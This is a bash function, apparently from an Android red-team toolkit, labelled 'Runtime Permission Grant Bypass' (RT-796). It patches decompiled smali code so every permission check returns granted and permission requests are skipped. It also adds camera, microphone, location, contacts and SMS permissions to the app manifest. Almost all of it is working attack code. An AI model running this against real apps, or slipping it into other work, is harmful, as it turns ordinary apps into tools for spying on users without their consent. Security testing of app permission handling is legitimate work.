# ============================================================
# PERMISSION ESCALATION — RT-796 to RT-800
# ============================================================

rt_796_runtime_permission_bypass() {
    rt_banner "RT-796" "Runtime Permission Grant Bypass"
    if ! is_apk_target || [[ ! -d "$APK_DECODED_DIR" ]]; then return 1; fi
    echo -e "    $CYAN[*] Patching runtime permission checks...$NC"
    local PERM_PATCHED=0
    local PERM_FILES
    PERM_FILES=$(find "$APK_DECODED_DIR" -name "*.smali" 2>/dev/null | xargs grep -l "checkSelfPermission\|requestPermissions\|shouldShowRequestPermissionRationale" 2>/dev/null)
    if [[ -n "$PERM_FILES" ]]; then
        echo -e "    $RED[+] Runtime permission checks in $(echo "$PERM_FILES" | wc -l) files$NC"
        for f in $PERM_FILES; do
            # Patch checkSelfPermission to always return PERMISSION_GRANTED (0)
            sed -i '/\.method.*checkSelfPermission/,/\.end method/{s/const\/4 v0, -0x1/const\/4 v0, 0x0/; s/const\/4 v0, 0x0/const\/4 v0, 0x0/}' "$f" 2>/dev/null
            # Add early return 0 to checkSelfPermission methods
            local MLINE
            MLINE=$(grep -n "checkSelfPermission" "$f" 2>/dev/null | grep "\.method" | head -1 | cut -d: -f1)
            if [[ -n "$MLINE" ]]; then
                sed -i "${MLINE}a\\    const/4 v0, 0x0\n    return v0\n    # PERMISSION_GRANTED_ALWAYS" "$f" 2>/dev/null
                PERM_PATCHED=$((PERM_PATCHED + 1))
            fi
            # Skip requestPermissions calls
            sed -i 's/invoke-virtual.*requestPermissions/# PERMISSION_REQUEST_SKIPPED/g' "$f" 2>/dev/null
        done
    fi
    # Pre-grant all permissions in manifest
    if [[ -f "$APK_DECODED_DIR/AndroidManifest.xml" ]]; then
        # Add permissions for camera, microphone, location, storage, contacts, phone, sms
        for perm in CAMERA RECORD_AUDIO ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE READ_CONTACTS READ_PHONE_STATE SEND_SMS READ_SMS; do
            if ! grep -q "android.permission.$perm" "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null; then
                sed -i '/<\/manifest>/i\\    <uses-permission android:name="android.permission.'"$perm"'"/>' "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null
            fi
        done
        echo -e "    $GREEN[+] All dangerous permissions pre-declared$NC"
    fi
    if [[ "$PERM_PATCHED" -gt 0 ]]; then
        echo -e "    $GREEN[+] $PERM_PATCHED runtime permission methods bypassed$NC"
        add_vuln "RT-796" "CRITICAL" "Runtime Permissions Bypassed" "$PERM_PATCHED permission checks patched to always grant" "apk" "full" "MITRE T1635"
    fi
}

